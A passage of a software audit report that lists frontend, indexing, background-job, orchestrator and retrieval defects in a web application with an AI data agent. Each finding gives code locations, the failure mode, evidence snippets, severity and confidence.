- **What is wrong**: Two defects in the same reconcile path. (1) `reconcileFromActive` and `reconcileFromPipelineStatus` only ever **add or update** the tasks they are told about; nothing marks a task terminal because it *disappeared* from the source of truth. The only transition to `completed`/`failed` is an SSE `pipeline_end` (`:113-137`). (2) `insertOptimistic` (`:195`) creates a task with `status: "queued"`, and the widget's pill counts only `running` and `failed`, so a queued task falls into the final `else` — `"1 done"` — and line 258 picks the **check** icon.
- **Concrete failure**: (1) The user starts a repository index. The SSE connection drops (`useGlobalEvents.ts:48-59` reconnects with backoff up to 30 s) and the reconnect lands after the run finished. `seedActiveTasks` returns a list that no longer contains it, so the task is never touched again: the pill shows a spinning "1 task" with an elapsed counter climbing past the real run, and a Cancel button for a run that ended. Only a reload clears it. (2) In `KnowledgeHealthPanel`, the user clicks "Re-index repository". Between `insertOptimistic` (`KnowledgeHealthPanel.tsx:106`) and the moment the pipeline-status endpoint reports `is_indexing: true`, the header pill reads **"✓ 1 done"** for an index that has not started.
- **Evidence**:
  ```ts
  // ActiveTasksWidget.tsx:176-177, 227-235
  const runningCount = taskList.filter((t) => t.status === "running").length;
  const failedCount  = taskList.filter((t) => t.status === "failed").length;
  ...
  } else { pillLabel = taskList.length === 1 ? "1 done" : `${taskList.length} done`; }
  ```
  `grep -n "queued" ActiveTasksWidget.tsx` matches only line 239, the sort order — never the label or the icon. `RunCard.tsx:65` treats it correctly (`task?.status === "running" || task?.status === "queued"`), so the two surfaces disagree about the same task.
- **Severity**: medium — no data is lost, but the one widget whose job is to say what is happening says the opposite twice.
- **Confidence**: certain for (2); certain for (1) by construction — no code path removes or terminates an absent running task.

---

## FE-07 — A saved-queries panel whose fetch failed says "No saved queries yet"

*`FE` — Frontend and interface states*

- **Where**: `frontend/src/stores/notes-store.ts:78-82` and `frontend/src/components/notes/NotesPanel.tsx:110-122`
- **What is wrong**: `loadNotes` sets `notes: []` on failure and raises a toast; the panel has exactly two states, loading and empty. There is no error state, so a failed load is rendered as the affirmative claim that the user has saved nothing — complete with the onboarding hint explaining how to save their first one.
- **Concrete failure**: The user has 40 saved queries. `GET /notes` returns 500. The drawer shows the bookmark icon, "No saved queries yet", and "When the agent returns SQL results, click the bookmark icon to save them here". The toast is gone in 10 s. A user who opens the drawer 15 s later has no way to tell their queries still exist.
- **Evidence**:
  ```ts
  } catch {
    if (get().loadedProjectId === projectId) {
      set({ notes: [] });                                  // indistinguishable from "none"
      toast("Failed to load saved queries", "error");
    }
  }
  ```
  ```tsx
  ) : notes.length === 0 ? ( … "No saved queries yet" … )
  ```
  The store carries `isLoading` and `loadedProjectId` but no error field, while `ListError` exists and is used by four other panels.
- **Severity**: medium — user-owned data reported as absent; recoverable by reload, but the message actively misleads.
- **Confidence**: certain.

---

## FE-08 — The chat stream's 120-second idle timeout can never report itself as a timeout

*`FE` — Frontend and interface states*

- **Where**: `frontend/src/lib/api/chat.ts:145-147` and `:239-255`
- **What is wrong**: Same root cause as FE-01, different consequence. The idle timer aborts with the reason string `"Stream idle timeout"`, so the body-stream read rejects with a **string**. The catch tests two object shapes (`instanceof DOMException`, or an object whose `name` is `"AbortError"`); a string satisfies neither, so the `error_type: "timeout"` branch at line 247 is unreachable and control falls to line 256.
- **Concrete failure**: The agent stalls for two minutes mid-answer (an LLM provider hang; the orchestrator's own wall clock is 180 s, so this fires first). The user is told **"An unexpected error occurred. Please try again."** instead of "The response timed out. Please try again." — the one message that would tell them retrying is reasonable and that nothing is broken about their question. Deliberate aborts (Stop, session switch) are unaffected: those call `abort()` with no reason and do produce a `DOMException`.
- **Evidence**: reproduced against a server that sends SSE headers plus one event and then goes silent, aborting the reader with the same reason string:
  ```
  typeof: string | instanceof DOMException: false | object-with-name-AbortError: false
  => takes the AbortError branch? false
  => falls through to "An unexpected error occurred"? true
  String(err) = "Stream idle timeout"
  ```
- **Severity**: medium — the failure is surfaced, just under the wrong name, and the code that names it correctly has never run.
- **Confidence**: certain — reproduced.

---

## FE-09 — The chat scrolls itself once per streamed token, with `behavior: "smooth"` and no reduced-motion exit

*`FE` — Frontend and interface states*

- **Where**: `frontend/src/components/chat/ChatPanel.tsx:323-325`, driven by `handleToken` at `:133-135`
- **What is wrong**: The scroll effect lists `streamingText` among its dependencies, and `handleToken` appends every SSE `token` chunk to it, so each token commits a render and fires a fresh `scrollIntoView({ behavior: "smooth" })`. It is unconditional — there is no check of whether the user is already at the bottom — and `behavior: "smooth"` is specified in JavaScript, which the `prefers-reduced-motion` block at `globals.css:276-285` cannot reach (it zeroes `--dur-*` custom properties; there is no `scroll-behavior` declaration anywhere in the file to override).
- **Concrete failure**: While an answer streams, the user scrolls up to re-read the SQL of the previous answer. Every token yanks the viewport back to the bottom mid-animation, so the scroll position is unusable until the answer finishes. A user who has set "reduce motion" at the OS level gets the same continuous smooth-scroll animation, because the app's reduced-motion contract (`MotionConfig reducedMotion="user"` at `app/app/page.tsx:416`, plus the CSS block) covers Framer Motion and CSS but not this call.
- **Evidence**:
  ```tsx
  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages, pipelineStages, streamingText, isThinking]);
  ```
  ```tsx
  const handleToken = useCallback((chunk: string) => {
    setStreamingText((prev) => prev + chunk);      // one commit per token
  }, []);
  ```
  `grep -n "scroll-behavior" src/app/globals.css` → no matches.
- **Severity**: medium — it makes reading during a stream impossible and violates the reduced-motion contract the rest of the app honours.
- **Confidence**: certain for the scroll hijack and the missing reduced-motion guard. The per-token cost depends on how React batches the SSE callbacks; that would be settled by counting `scrollIntoView` calls over one streamed answer in the browser.

---

## KNOW-09 — Four steps record completion that nothing reads, and three of them carry comments asserting a resume guard that does not exist

*`KNOW` — Knowledge indexing*

- **Where**: `backend/app/knowledge/pipeline_runner.py:626-628` (`graph_build`), `:940-946` (`graph_clustering`), `:1444-1447` (`bm25_build`), `:843` (`graph_db_bridge`), `:978` (`enrich_docs`) — against the only five reads of `done`, at `:298`, `:521`, `:550`, `:651`, `:703`.
- **What is wrong**: `complete_step` is called for twelve step names; `done` is consulted for five. The three gated writes are each guarded by a success flag with a comment explaining that a resume must re-run a failed step — but no resume ever reads those names, so the guard is inert in both directions. The `bm25_build` comment ("A failed BM25 build must NOT mark the step complete — otherwise a resume would skip the rebuild and the hybrid retriever would degrade silently") describes a mechanism that is not wired; the `graph_build` comment at `:626` says it "mirror[s] the bm25/clustering gate", mirroring something equally inert. Behaviourally these three steps always re-run, which is safe; the cost is that a reader auditing resume safety will conclude it is enforced when it is not, and `graph_clustering` — whose re-run costs LLM tokens for `label_clusters` — repeats its spend on every resume despite code written specifically to prevent that.
- **Concrete failure**: someone adds a `if "bm25_build" in done: skip` fast path, reasonably believing the success gate at `:1446` already makes it safe. It does not — `graph_build`'s gate at `:628` is also unread, so a run whose graph build crashed and whose BM25 build succeeded would, on resume, skip BM25 while the graph it indexes is stale. The five unread names also inflate `done`, and `result.resumed_from_step = sorted(done)[-1]` (`:176`) therefore reports an alphabetically-last name (`project_profile`, or `pipeline_failed` from `:251`) rather than the last step actually reached.
- **Evidence**:
  ```
  $ grep -n 'complete_step(' app/knowledge/pipeline_runner.py
  251 pipeline_failed   361 detect_changes   547 cleanup_deleted   587 project_profile
  614 ast_parse         628 graph_build      660 code_symbol_embed 763 cross_file_analysis
  843 graph_db_bridge   946 graph_clustering 978 enrich_docs      1447 bm25_build

  $ grep -n 'in done' app/knowledge/pipeline_runner.py
  298:  if "detect_changes" in done:
  521:  if "cleanup_deleted" not in done:
  550:  if "project_profile" in done and checkpoint.profile_json != "{}":
  651:  and "code_symbol_embed" not in done
  703:  if "cross_file_analysis" in done and checkpoint.knowledge_json != "{}":
  ```
- **Severity**: medium — no wrong data today, but it is a documented safety property that is not implemented, sitting directly on the path a future change will take.
- **Confidence**: certain (the two greps above are the whole proof).

---

## OPS-09 — The worker's BM25 reconcile is awaited in `on_startup`, and its own comment says it does not block job pickup

*`OPS` — Background work, observability, deploy*

- **Where**: `backend/app/worker.py:334-351`
- **What is wrong**: the comment at `:338` reads "Best-effort; never blocks the worker from taking jobs", but `_bm25 = await reconcile_local_bm25()` at `:342` is inside `on_startup`, which arq awaits to completion before entering its polling loop. `reconcile_local_bm25` reads every `KnowledgeDoc` row and every code symbol for every project with content and tokenizes them (`bm25_local_reconcile.py:62-86`) — the production corpus is 31 392 chunks from 763 documents. The web side got this right: `main.py:227` uses `spawn_tracked(_bm25_boot_rebuild(), …)` precisely so it stays off the boot path.
- **Concrete failure**: the worker restarts mid-rebuild. `requeue_orphaned_runs` correctly re-enqueues the interrupted `index_repo` at `:320`. The worker then spends the BM25 reconcile's full duration before taking that job — added to the recovery latency of the one job class that cannot be recovered any other way, and paid on every single worker boot even when nothing is missing (the present-snapshot check is per project, after the disk read).
- **Evidence**:
```python
339	    try:
340	        from app.ops.bm25_local_reconcile import reconcile_local_bm25
341	
342	        _bm25 = await reconcile_local_bm25()
```
against `main.py:227`: `spawn_tracked(_bm25_boot_rebuild(), name="bm25_local_reconcile")`.
- **Severity**: medium — bounded delay, but a comment asserting the opposite of the code is how the next person leaves it there.
- **Confidence**: certain for the ordering. Duration would be settled by timing `reconcile_local_bm25()` against a production-sized corpus.

---

## OPS-10 — The reaper's requeue budget counts the reap it is currently performing, so the documented "2 per 6 h" is really 1

*`OPS` — Background work, observability, deploy*

- **Where**: `backend/app/services/stale_run_reaper.py:157-168` and `:333-350`
- **What is wrong**: `reap_once` executes the `UPDATE … SET status='failed', error=REAP_ERROR, finished_at=now()` at `:333-342`, then `await session.flush()` at `:348`, and only then calls `_requeue` at `:350`. `_requeue_attempts` queries `IndexingRun.error == REAP_ERROR AND finished_at >= window` **in that same session**, so the run being reaped right now is inside its own attempt count. With `reaper_requeue_max_attempts = 2` the first reap sees `attempts == 1` and requeues; the second sees `attempts == 2` and refuses. The log line at `:259` compounds the confusion by printing `attempts + 1`, so the very first requeue is announced as "attempt 2".
- **Concrete failure**: a repo index is reaped once (genuine heartbeat starvation) and requeued. The replacement is reaped a second time. The reaper refuses with *"2 reaps in the last 6h is at the bound; the run is failing for its own reasons, not a restart"* — a message about a bound the operator believes allows two retries, after exactly one has been spent. On 2026-09-09 the budget being wrongly exhausted was what refused a third rebuild; this halves the budget again, in the same direction.
- **Evidence**:
```python
333	        runs_failed: CursorResult = await session.execute(
334	            update(IndexingRun)
335	            .where(IndexingRun.status == "running", self._stale_run(IndexingRun, cutoff))
336	            .values(status="failed", error=REAP_ERROR, …, finished_at=datetime.now(UTC))
337	        )
...
348	        await session.flush()
349	        await self._catalog(session, doomed)
350	        await self._requeue(session, doomed)
```
- **Severity**: medium — the bound is tighter than documented and the log actively misreports which attempt it is on. A secondary point in the same function: `_requeue` calls `enqueue` while the reap transaction is still uncommitted (the commit is at `reaper_loop.py:27`), so a commit failure leaves a job enqueued against rows still marked `running`.
- **Confidence**: certain — the flush precedes the count query on the same session, so the row is visible to it.

---

## OPS-11 — `record_run` recomputes `next_run_at` at completion, silently discarding the slot `claim_due` reserved

*`OPS` — Background work, observability, deploy*

- **Where**: `backend/app/services/scheduler_service.py:186-197` (`claim_due`) and `:218-223` (`record_run`)
- **What is wrong**: two writers own one column and neither knows about the other. `claim_due` advances `next_run_at` atomically at claim time — that is what makes the loop multi-dyno safe. `record_run`, called after execution on every outcome path in `_scheduler_loop`, unconditionally overwrites it with `compute_next_run(schedule.cron_expression)` based on `datetime.now()` at completion time, with no condition on the row still being this runner's claim.
- **Concrete failure**: a schedule with cron `*/5 * * * *` and a query that takes 70 seconds. `claim_due` at 10:00:00 sets `next_run_at = 10:05`. The query finishes at 10:01:10; `record_run` sets `next_run_at = compute_next_run(now=10:01:10) = 10:05`. Fine. Now the same schedule against a slower table, 6 minutes: claim at 10:00 sets 10:05; `record_run` at 10:06 sets 10:10. The 10:05 tick the claim reserved is gone — not late, cancelled — and nothing records that it was skipped. Every schedule whose runtime exceeds the gap to its next tick runs at a permanently reduced rate that its own history does not reveal.
- **Evidence**:
```python
194	            .values(next_run_at=self.compute_next_run(cron_expression, base=now))   # claim_due
...
223	            schedule.next_run_at = self.compute_next_run(schedule.cron_expression)  # record_run
```
- **Severity**: medium — silent under-execution of a user-configured schedule, and it defeats the purpose of the atomic claim it overwrites.
- **Confidence**: certain for the double write. Whether a production schedule is currently long enough to skip a tick would be settled by comparing `schedule_runs.executed_at` gaps against `cron_expression`.

---

## OPS-12 — `config.py` asserts an invariant that is arithmetically false and names a test that deliberately deleted it

*`OPS` — Background work, observability, deploy*

- **Where**: `backend/app/config.py:664-667` against `backend/app/config.py:592` and `backend/tests/unit/services/test_repo_index_ceiling.py:115-130`
- **What is wrong**: the comment reads *"Invariant, asserted in `tests/unit/services/test_repo_index_ceiling.py`: this stays below `daily_knowledge_sync_job_timeout_seconds`, which contains it plus a DB index plus a code↔DB sync."* `repo_index_job_timeout_seconds = 21600`; `daily_knowledge_sync_job_timeout_seconds = 7200`. 21 600 is not below 7 200. The named test contains a class whose entire docstring explains that this invariant was **removed** on 2026-08-27 because asserting it "capped the manual path below what a full rebuild needs". So the comment states a false relation and claims a test coverage that was consciously deleted — the exact "two ceilings tied together" error the test file exists to prevent someone repeating.
- **Concrete failure**: an engineer raising the nightly ceiling reads this comment, believes the two are ordered, and either lowers `repo_index_job_timeout_seconds` to restore the "invariant" (cutting off every full rebuild at 2 hours again — the failure of 2026-08-19 and 2026-08-27) or wires a new assertion that fails on the current defaults.
- **Evidence**:
```python
# config.py
664	    # Invariant, asserted in `tests/unit/services/test_repo_index_ceiling.py`: this
665	    # stays below `daily_knowledge_sync_job_timeout_seconds`, which contains it plus
666	    # a DB index plus a code↔DB sync.
667	    repo_index_job_timeout_seconds: int = 21600
592	    daily_knowledge_sync_job_timeout_seconds: int = 7200
```
```python
# tests/unit/services/test_repo_index_ceiling.py:115
class TestTheTwoCeilingsCoverDifferentWork:
    """The first version of this file asserted `repo < daily` … the ordering
    was not an invariant, and asserting it capped the manual path below what a
    full rebuild needs."""
```
- **Severity**: medium — a stale comment, but it is the one comment placed to stop a specific, twice-committed mistake, and it now argues for it.
- **Confidence**: certain.

---

## OPS-13 — The capability report prints "all satisfied" when a claim could not be evaluated, and never runs in the worker

*`OPS` — Background work, observability, deploy*

- **Where**: `backend/app/ops/capability_report.py:183-200`, and `backend/app/main.py:112-114` as the only call site
- **What is wrong**: two problems in the module whose own docstring says *"silence is indistinguishable from the check not running"*. First, a claim whose `asserted()` or `provided()` raises is logged at `logger.debug` (`:195`) — invisible in production, which runs at INFO — and is **not** appended to `unmet`, so `if not unmet:` at `:196` prints `"…%d configuration claims verified against the runtime, all satisfied"` with `len(CLAIMS)` computed from the input rather than from what was actually checked. An unevaluable claim reads exactly like a passing one. Second, `report_capabilities()` is called only from the FastAPI lifespan, so the worker — where the embedder and the reranker actually do their work — never states its capabilities at all.
- **Concrete failure**: `_active_backend()` raises (a malformed `DATABASE_URL`, an import error under a partial image). The vector-store claim is skipped at DEBUG. The other four claims pass. The boot log prints `Capability check: 5 configuration claims verified against the runtime, all satisfied` — a count of five over four evaluations, and the one that mattered is the one that vanished.
- **Evidence**:
```python
194	        except Exception:
195	            logger.debug("capability claim %s could not be evaluated", claim.setting, exc_info=True)
196	    if not unmet:
197	        logger.info(
198	            "Capability check: %d configuration claims verified against the runtime, all satisfied",
199	            len(CLAIMS),
200	        )
```
```
$ grep -rn "report_capabilities" backend/app --include='*.py'
app/main.py:112:    from app.ops.capability_report import report_capabilities
app/main.py:114:    report_capabilities()
app/ops/capability_report.py:180:def report_capabilities() -> list[Claim]:
```
- **Severity**: medium — a diagnostic that reports success about its own failure, in the module written to abolish exactly that.
- **Confidence**: certain.

---

## ORCH-04 — both production pipelines build `StageValidator()` without an LLM router, so business-rule validation is a one-substring heuristic

*`ORCH` — Orchestrator and pipeline*

- **Where**: `backend/app/agents/orchestrator.py:2500` and `:3020`, overriding the default at `backend/app/agents/stage_executor.py:143`
- **What is wrong**: `StageExecutor.__init__` deliberately defaults to `StageValidator(llm_router=llm_router)` so planner-supplied business rules get the LLM evaluator its class docstring describes ("This makes the check AI-first and schema-agnostic", `stage_validator.py:72-77`). Both call sites that actually run in production pass a bare `StageValidator()`, so `self._llm_router is None` and `_evaluate_business_rule_async` returns immediately to the heuristic (`stage_validator.py:204-206`). That heuristic recognises exactly one rule shape: the literal substring `"no negative"` (`:317-318`). Every other rule the planner writes is a silent no-op that still reports itself as evaluated.
- **Concrete failure**: The planner emits `validation.business_rules = ["conversion rate must not exceed 100%"]` on a stage. `validate_async` runs, `rule_lower` contains no `"no negative"`, the function returns having checked nothing, and `_emit_stage_validation` publishes `{"passed": true, "warnings": [], "errors": []}` — a clean bill of health on a rule nobody evaluated.
- **Evidence**:
```python
# stage_executor.py:143   (the default that is never used)
        self._validator = validator or StageValidator(llm_router=llm_router)
# orchestrator.py:2500 / :3020   (what is actually constructed)
            validator=StageValidator(),
# stage_validator.py:204-206
        if not qr or not qr.rows or self._llm_router is None:
            self._evaluate_business_rule(rule, result, outcome)
            return
```
- **Severity**: medium — both evaluators only `warn` (`:329`, `:227`), so no stage passes that would otherwise have failed; the loss is a check reported as performed and never performed.
- **Confidence**: certain.

---

## ORCH-05 — two per-workflow caches on the process-lifetime orchestrator singleton are never swept

*`ORCH` — Orchestrator and pipeline*

- **Where**: `backend/app/agents/orchestrator.py:513-527` (`_cleanup_stale_results`), populated at `:1845` and `:632`/`:641`
- **What is wrong**: the sweep enumerates stale ids from `self._wf_enriched` only, and `_wf_enriched` is written in exactly one place — `ToolDispatcher._handle_process_data` (`tool_dispatcher.py:628`). Every workflow that runs `query_database` writes `_wf_sql_results[wf_id]` (a list of `SQLAgentResult`, each holding a full `QueryResult` with all rows) and possibly `_wf_correction_counts[wf_id]`; unless that same workflow also called `process_data`, neither key is ever reachable by the sweep and neither has a `pop_*` drain. `chat.py:62` builds `ConversationalAgent()` at module scope, so these dicts live for the life of the dyno.
- **Concrete failure**: 1 000 chat turns that query the database and never call `process_data` leave 1 000 entries in `_wf_sql_results`, each pinning the query's full row set. On the `web` dyno this is the same memory the deployment already runs tight on (R14 history in `CLAUDE.md`), and nothing frees it short of a restart. `_wf_correction_counts` leaks alongside it.
- **Evidence**:
```
$ .venv/bin/python  # three finished workflows, then the sweep with stale_seconds=0
after sweep, _wf_sql_results       = {'wf-0': [...], 'wf-1': [...], 'wf-2': [...]}
after sweep, _wf_correction_counts = {'wf-0': 1, 'wf-1': 1, 'wf-2': 1}
```
```python
# orchestrator.py:518-520 — the id list comes from the rarest of the six dicts
        stale_wf_ids = [
            wid for wid, (_, ts) in self._wf_enriched.items() if (now - ts) > stale_seconds
        ]
```
- **Severity**: medium — unbounded growth on a memory-constrained long-lived process; not a wrong answer, but the failure mode is an OOM kill mid-request.
- **Confidence**: certain (reproduced above).

---

## ORCH-06 — the resumed pipeline runs without the answer-quality gate and without the freshness warning the fresh path supplies

*`ORCH` — Orchestrator and pipeline*

- **Where**: `backend/app/agents/orchestrator.py:3034-3040` and `:3078`, against the fresh path at `:2514-2521` and `:2600-2606`
- **What is wrong**: `_execute_resume` is a second implementation of the pipeline tail and has drifted from `_run_complex_pipeline` in two places. It calls `executor.execute(...)` with no `staleness_warning`, so no stage prompt and no synthesis prompt on the resumed run carries the knowledge-freshness block that `_build_stage_question` (`stage_executor.py:730-731`) and `_synthesize` (`:1404-1408`) inject on the fresh path. And it calls `ResponseBuilder.build_pipeline_response(exec_result, wf_id, None, run_id)` with no `answer_directive`, so `AnswerQualityGate` (`_evaluate_pipeline_answer`) never runs — `answer_directive` defaults to `None` (`response_builder.py:50`) and the `is not None` guard at `:104` skips the downgrade.
- **Concrete failure**: A user hits a `stage_checkpoint`, clicks "continue", and the resumed pipeline synthesises a vague or partial answer. On the fresh path that answer is downgraded to `response_type="step_limit_reached"` with the "Continue analysis" CTA; on the resume path it is published as `pipeline_complete` with `error=None` — a green seal on an answer the gate would have refused. Separately, if the DB index is stale or the git clone is behind HEAD, the resumed stages are never told.
- **Evidence**:
```python
# orchestrator.py:3034-3040 — no staleness_warning=
            exec_result = await executor.execute(
                plan, resume_ctx, resume_from=resume_from,
                stage_ctx=stage_ctx, deadline=resume_deadline,
            )
# orchestrator.py:3078 — no answer_directive=
        return ResponseBuilder.build_pipeline_response(exec_result, wf_id, None, run_id)
# vs orchestrator.py:2600-2606 (fresh path)
        answer_directive = await self._evaluate_pipeline_answer(...)
        return ResponseBuilder.build_pipeline_response(..., answer_directive=answer_directive)
```
- **Severity**: medium — a documented gate (ORCH-A02) is bypassed on a first-class UX flow, and the bypass is invisible.
- **Confidence**: certain.

---

## ORCH-07 — a fallback to the flat loop overwrites the router's real verdict, so metrics and the persisted trace report `explore`/`moderate`

*`ORCH` — Orchestrator and pipeline*

- **Where**: `backend/app/agents/orchestrator.py:2317-2342` (`_fallback_to_unified`) → `:776-783` and `:800-815`
- **What is wrong**: `_fallback_to_unified` re-enters `run()` with `_skip_complexity` set. That flag takes the branch at `:776` which synthesises `RouteResult(route="explore", complexity="moderate", estimated_queries=2)`, and `:800-808` / `:811-815` then overwrite both `context.extra` and `self._wf_routing[wf_id]` with those constants. The docstring two hundred lines below claims the opposite: *"Preserve the original `complexity` from `context.extra` so a single bad JSON does not permanently downgrade a complex turn to `moderate`/`explore`"* (`:2330-2332`). Nothing preserves it. `_wf_routing` is drained into the response and thence into `request_traces` (`app/core/agent.py:106-110`) — the exact column Ш0a existed to make honest.
- **Concrete failure**: The router classifies a question `complexity="complex"`, the planner produces a 2-data-stage plan, `_run_complex_pipeline` bounces it (`:2456-2463`), and the turn finishes in the flat loop. `_record_request_metrics` (`:2205`) records `complexity="moderate"` and the persisted trace records `route="explore"`. Both the trivial-plan bounce and the planning-failure bounce hit this, so *every* pipeline→flat-loop fallback is mis-attributed and "how often does the pipeline bounce, and on what?" is unanswerable from the trace.
- **Evidence**:
```python
# orchestrator.py:776-783
            if is_continuation or context.extra.get("_skip_complexity"):
                route_result = RouteResult(
                    route="explore", complexity="moderate", ...
# orchestrator.py:811-815 — the caller-visible copy is overwritten with the synthetic values
            self._wf_routing[wf_id] = (
                route_result.route, route_result.complexity, route_result.estimated_queries,
            )
```
- **Severity**: medium — a summary computed from a synthetic input rather than from what happened, in the field a prior fix (222/222 `"unknown"`) was written to make trustworthy.
- **Confidence**: certain.

---

## ORCH-08 — a failed final synthesis is reported as `pipeline_complete` whenever the plan does not end in a `synthesize` stage

*`ORCH` — Orchestrator and pipeline*

- **Where**: `backend/app/agents/stage_executor.py:387`
- **What is wrong**: `_synthesize` returns `(answer, degraded_reason)` and the fallback path in `execute()` discards the second element into `_degraded_reason`, then returns `status="completed"`. `_StageExecutorResult` has no field for it (`:1580-1604`), and `ResponseBuilder` derives "degraded" solely by scanning stage results for `status == "degraded"` (`response_builder.py:86-91`) — a status only `_synthesize_stage` ever sets. On this path no stage result exists to carry it, so the response is typed `pipeline_complete` with `error=None`.
- **Concrete failure**: The planner ends a plan with `analyze_results` — which its own prompt sanctions ("The last stage should normally be `synthesize` or `analyze_results`", `planner_prompt.py:74-75`). The `if last_stage.tool == "synthesize"` shortcut at `:380` misses, `execute()` falls through to `:387`, the synthesis LLM call fails, and the user gets the per-stage dump ("Pipeline completed all stages but the final synthesis step failed…") sealed as a completed pipeline with no error recorded. The same holds if the plan *does* end in `synthesize` but its degraded summary is empty.
- **Evidence**:
```python
# stage_executor.py:387
        final_answer, _degraded_reason = await self._synthesize(stage_ctx, context)
        return _StageExecutorResult(
            status="completed", stage_ctx=stage_ctx, final_answer=final_answer
        )
```
- **Severity**: medium — the answer text is honest, the response metadata is not, so `response_type`/`error` and any dashboard built on them under-report synthesis failures.
- **Confidence**: certain.

---

## ORCH-09 — the pipeline's truncation caveat and its answer gate read only the *last* stage that produced rows

*`ORCH` — Orchestrator and pipeline*

- **Where**: `backend/app/agents/response_builder.py:71-72` and `:92-101`; the same shape at `backend/app/agents/orchestrator.py:3294-3297`
- **What is wrong**: `last_sql_result` is assigned by every stage with a non-`None` `query_result` in plan order, so it ends up holding the last such stage rather than the truncated one. The `PARTIAL DATA` caveat and the `results`/`query` fields returned to the UI are both derived from it, and `_evaluate_pipeline_answer` overwrites `last_row_count`/`last_truncated` in the same loop before handing them to `AnswerValidator`. A truncated earlier stage is therefore invisible to both.
- **Concrete failure**: Plan = `s1: query_database` (capped, `truncated=True`, 10 000 of 480 000 rows) → `s2: query_analytics_source` (fresh GA4 rows, `truncated=False`) → `s3: analyze_results` → `s4: synthesize`. `last_sql_result` is `s2`. No `PARTIAL DATA` caveat is appended, `AnswerValidator` is told `truncated=False`, and the synthesis' total derived from `s1` is published as a complete figure. `results` returned to the UI is the GA4 table and `query` is `None`, so the user cannot see the SQL either. (Note this is a different mechanism from `derive_result`, which correctly carries `truncated` through in-memory transforms — the gap is only in the *reporting* loop.)
- **Evidence**:
```python
# response_builder.py:71-72 — the last stage with ANY query_result wins
            if sr.query_result:
                last_sql_result = sr
# response_builder.py:92-96 — the caveat asks only that one
            if (last_sql_result and last_sql_result.query_result
                and last_sql_result.query_result.truncated):
# orchestrator.py:3294-3297 — same overwrite before the answer gate
                if sr.query_result is not None:
                    last_row_count = sr.query_result.row_count
                    last_truncated = bool(sr.query_result.truncated)
```
- **Severity**: medium — truncated data presented as complete, which is precisely what the W1/T14 truncation plumbing exists to prevent; requires a multi-source plan to bite.
- **Confidence**: certain about the code path; needs-verification on frequency — grep production `pipeline_runs` for runs whose non-final stage carries `truncated` to size it.

---

## ORCH-10 — a resumed stage's prompt reports the original row count beside ten persisted sample rows and never says the set is a sample

*`ORCH` — Orchestrator and pipeline*

- **Where**: `backend/app/agents/stage_context.py:276-282`; the same omission at `backend/app/agents/stage_executor.py:1361-1363`
- **What is wrong**: `StageResult.from_summary_dict` restores at most `_MAX_SAMPLE_ROWS = 10` rows while keeping the original `row_count`, and marks the result `truncated=True` with a WARNING log (`stage_context.py:200-208`). `build_context_for_stage` then renders `Rows: {row_count}` and `Sample data (first N rows)` and never reads `truncated`. `_synthesize` builds its prompt the same way. So the string handed to the model asserts a row count that no longer exists in memory.
- **Concrete failure**: A checkpoint pauses after `s1: query_database` returned 5 000 rows; the user clicks "continue". On resume, `s1`'s result holds 10 rows with `row_count=5000`. The downstream `analyze_results` stage's prompt reads `Rows: 5000 … Sample data (first 5 rows): [...]` — the model reasonably concludes 4 995 more rows exist behind the sample and reasons about the population. The `process_data` path is protected (`derive_result` carries `truncated`, and `_aggregate_data` prefixes PARTIAL DATA at `data_processor.py:352-357`); the LLM path has no such guard.
- **Evidence**:
```python
# stage_context.py:274-282 — no reference to sr.query_result.truncated anywhere in the builder
            if sr.query_result:
                lines.append(f"  Columns: {sr.query_result.columns}")
                lines.append(f"  Rows: {sr.query_result.row_count}")
                if sr.query_result.rows:
                    sample = sr.query_result.rows[:5]
                    lines.append(f"  Sample data (first {len(sample)} rows): ...")
```
- **Severity**: medium — prompt dishonesty on the resume path, bounded to plans containing an LLM stage downstream of a checkpoint.
- **Confidence**: certain.

---

## ORCH-11 — a connection error re-runs the identical statement with no idempotency check, including DML on a writable connection

*`ORCH` — Orchestrator and pipeline*

- **Where**: `backend/app/core/validation_loop.py:446-462`
- **What is wrong**: `_try_repair` treats `QueryErrorType.CONNECTION_ERROR` as purely environmental and re-issues `failed_query` verbatim after a backoff. That reasoning holds for `SELECT` and is stated as such in `app/core/error_types.py:41-44` ("it is NOT a query problem"). It does not hold for a statement that may have committed before the socket dropped, and nothing distinguishes the two: `SafetyGuard` is at `SafetyLevel.ALLOW_DML` whenever `connection_config.is_read_only` is false (`validation_loop.py:83-86`), and the SQL prompt permits writes on request ("Generate only SELECT / read-only queries **unless explicitly asked otherwise**", `app/agents/prompts/sql_prompt.py:146`). The repo already has the right primitive for this — `core/safety.is_read_only_statement`, used by the SSH path's F-SSH-07 fix — and it is not consulted here.
- **Concrete failure**: A user with `is_read_only=False` asks the agent to mark a batch of rows processed. `UPDATE orders SET status='done' WHERE …` executes, the server commits, then the connection is lost while returning (MySQL `Lost connection`, matched at `error_classifier.py:127`). `is_retryable` is `True` (`CONNECTION_ERROR` is not in `NON_RETRYABLE_ERRORS`, which holds only `PERMISSION_DENIED`), `should_retry` passes, and the same `UPDATE` is re-sent. For a non-idempotent statement — `UPDATE … SET n = n + 1`, `INSERT` without a unique key — the write happens twice and neither the agent nor the user is told.
- **Evidence**:
```python
# validation_loop.py:452-462
        if error.error_type in _TRANSIENT_RETRY_ERRORS:
            delay = min(_TRANSIENT_BACKOFF_BASE_SECONDS * (2 ** (current_attempt - 1)),
                        _TRANSIENT_BACKOFF_MAX_SECONDS)
            logger.info("Transient %s on attempt %d — re-running the same query after %.2fs backoff", ...)
            await asyncio.sleep(delay)
            return failed_query, current_explanation
# error_types.py:36-40
NON_RETRYABLE_ERRORS = frozenset({QueryErrorType.PERMISSION_DENIED})
```
- **Severity**: medium — a silent duplicate write, gated behind a non-default connection setting (`Connection.is_read_only` defaults `True`, `app/models/connection.py:92`) and an explicit user request for a write.
- **Confidence**: certain about the code path; needs-verification on exposure — query production for connections with `is_read_only = false` to decide whether this is theoretical here.

---

## RET-04 — the dense leg's degradation reason says the cause is unknown while the retriever itself is the cause

*`RET` — Retrieval*

- **Where**: `backend/app/knowledge/hybrid_retriever.py:180-189`, filter at `:257-270`.
